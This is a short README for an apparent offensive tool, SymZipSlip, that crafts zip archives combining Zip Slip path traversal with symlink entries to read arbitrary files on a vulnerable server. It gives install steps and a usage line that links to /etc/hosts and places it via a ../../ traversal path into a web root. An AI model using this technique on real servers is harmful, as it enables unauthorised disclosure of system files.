# SymZipSlip
## Introduction
SymZip allows to combine two vulnerabilities a Zip Slip and Zip Symlink in order to have an Aritrary file read on a vulnerable server.
## Installation
- `git clone https://github.com/spawnzii/SymZipSlip.git`
- `cd SymZipSlip ; pip install -r requirements.txt`
## Usage
- `python3 symzip.py -s /etc/hosts -n ../../../../../../var/www/html/poc -o spz.zip`
